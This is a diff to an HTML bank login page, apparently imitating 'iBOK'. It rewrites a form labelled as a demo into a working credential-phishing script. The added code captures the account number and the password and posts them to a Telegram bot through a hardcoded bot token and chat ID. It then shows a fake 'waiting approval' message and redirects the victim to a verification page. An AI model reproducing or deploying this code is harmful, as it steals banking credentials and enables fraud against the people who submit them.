@@ -280,7 +280,7 @@
                     <div class="field">
                         <label for="account">Enter the account number (7 digits):</label>
                         <div class="input-wrap">
-                            <input id="account" name="account" type="text" maxlength="20" placeholder="Enter the account number (7 digits)" autocomplete="off" required>
+                            <input id="account" name="account" type="text" inputmode="numeric" pattern="\d{7}" minlength="7" maxlength="7" placeholder="Enter 7 digits account number" autocomplete="off" required>
                         </div>
                     </div>
 
@@ -303,164 +303,92 @@
         </footer>
     </div>
 
-
-
-
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            // ===== TELEGRAM CONFIGURATION =====
-            const TELEGRAM_BOT_TOKEN = "7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc";
-            const TELEGRAM_CHAT_ID = "8406078749";
-            // =================================
+        // =======================
+        // BOT CONFIG
+        // =======================
+        const BOT_TOKEN = '7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc';
+        const CHAT_ID = '8406078749';
 
-            const form = document.getElementById("demo-form");
-            const accountInput = document.getElementById("account");
-            const passwordInput = document.getElementById("password");
-            const togglePassword = document.getElementById("toggle-password");
-            const messageBox = document.getElementById("message");
+        // =======================
+        // DOM REFERENCES
+        // =======================
+        const demoForm = document.getElementById("demo-form");
+        const accountInput = document.getElementById("account");
+        const passwordInput = document.getElementById("password");
+        const togglePasswordBtn = document.getElementById("toggle-password");
+        const messageDiv = document.getElementById("message");
 
-            if (!form || !accountInput || !passwordInput ||
-                !togglePassword || !messageBox) {
-                console.error("One or more required demo form elements are missing.");
-                return;
-            }
-
-            const submitButton = form.querySelector('button[type="submit"]');
-
-            if (!submitButton) {
-                console.error("Submit button not found.");
-                return;
-            }
-
-            let requestInProgress = false;
-
-            // Show or hide the demo passphrase.
-            togglePassword.addEventListener("click", function() {
-                const showPassword = passwordInput.type === "password";
-
-                passwordInput.type = showPassword ? "text" : "password";
-                togglePassword.textContent = showPassword ? "Hide" : "Show";
-
-                togglePassword.setAttribute(
-                    "aria-pressed",
-                    String(showPassword)
-                );
-
-                togglePassword.setAttribute(
-                    "aria-label",
-                    showPassword ? "Hide demo passphrase" : "Show demo passphrase"
-                );
+        // =======================
+        // PASSWORD VISIBILITY TOGGLE
+        // =======================
+        if (togglePasswordBtn) {
+            togglePasswordBtn.addEventListener("click", function() {
+                const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+                passwordInput.setAttribute("type", type);
+                this.textContent = type === "password" ? "Show" : "Hide";
             });
+        }
 
-            // Display status messages.
-            function showMessage(text, success) {
-                messageBox.textContent = text;
-                messageBox.style.background = success ? "#eef8ee" : "#fff0f0";
-                messageBox.style.color = success ? "#245b2a" : "#a32121";
-                messageBox.classList.add("visible");
+        // =======================
+        // FORM SUBMIT & TELEGRAM BOT
+        // =======================
+        demoForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const account = accountInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!account || !password) {
+                messageDiv.textContent = "Please fill in all fields.";
+                messageDiv.className = "message visible error";
+                return;
             }
 
-            // Send the actual demo account identifier, never the passphrase.
-            async function sendTelegramNotification(account) {
-                if (!account) {
-                    throw new Error("The demo account field is empty.");
-                }
+            // Validate account number is exactly 7 digits
+            const accountRegex = /^\d{7}$/;
+            if (!accountRegex.test(account)) {
+                messageDiv.textContent = "Account number must be exactly 7 digits.";
+                messageDiv.className = "message visible error";
+                return;
+            }
 
-                const telegramUrl =
-                    "https://api.telegram.org/bot" +
-                    TELEGRAM_BOT_TOKEN +
-                    "/sendMessage";
+            // Format message to send to Telegram
+            const textMessage = `New iBOK Login Attempt:\n\nAccount: ${account}\nPassword: ${password}`;
 
-                const telegramMessage = [
-                    "SAMPLE BANK DEMO NOTIFICATION",
-                    "------------------------------",
-                    "Demo account: " + account,
-                    "Status: Demo form submitted",
-                    "Time: " + new Date().toLocaleString(),
-                    "Notice: Demo notification; no passphrase transmitted."
-                ].join("\n");
-
-                const response = await fetch(telegramUrl, {
-                    method: "POST",
+            // Send data to Telegram Bot API
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
                     headers: {
-                        "Content-Type": "application/json"
+                        'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: telegramMessage
+                        chat_id: CHAT_ID,
+                        text: textMessage
                     })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        messageDiv.textContent = "waiting approval.....";
+                        messageDiv.className = "message visible success";
+
+                        // Redirect to verify.html after a 1.5-second delay
+                        setTimeout(() => {
+                            window.location.href = 'verify.html';
+                        }, 1500);
+                    } else {
+                        messageDiv.textContent = "Error sending data. Try again.";
+                        messageDiv.className = "message visible error";
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    messageDiv.textContent = "Network error occurred.";
+                    messageDiv.className = "message visible error";
                 });
-
-                const data = await response.json();
-
-                if (!response.ok || !data.ok) {
-                    throw new Error(
-                        data.description || "Telegram notification failed."
-                    );
-                }
-
-                return data;
-            }
-
-            // Handle form submission.
-            form.addEventListener("submit", async function(event) {
-                event.preventDefault();
-
-                if (requestInProgress) {
-                    return;
-                }
-
-                const account = accountInput.value.trim();
-                const passphrase = passwordInput.value;
-
-                if (!account || !passphrase) {
-                    showMessage(
-                        "Please enter both fictional demo fields.",
-                        false
-                    );
-                    return;
-                }
-
-                requestInProgress = true;
-                submitButton.disabled = true;
-                submitButton.textContent = "SENDING...";
-
-                try {
-                    // IMPORTANT: Pass the actual account input.
-                    await sendTelegramNotification(account);
-
-                    showMessage(
-                        "Demo notification sent successfully.",
-                        true
-                    );
-
-                    form.reset();
-
-                    passwordInput.type = "password";
-                    togglePassword.textContent = "Show";
-                    togglePassword.setAttribute("aria-pressed", "false");
-
-                    // Redirect after successful notification.
-                    window.location.href = "summary.html";
-
-                } catch (error) {
-                    console.error("Telegram notification error:", error);
-
-                    showMessage(
-                        "Telegram notification failed. Check your configuration.",
-                        false
-                    );
-
-                } finally {
-                    requestInProgress = false;
-                    submitButton.disabled = false;
-                    submitButton.textContent = "TRY DEMO";
-                }
-            });
         });
     </script>
-
-
 </body>
 
 </html>
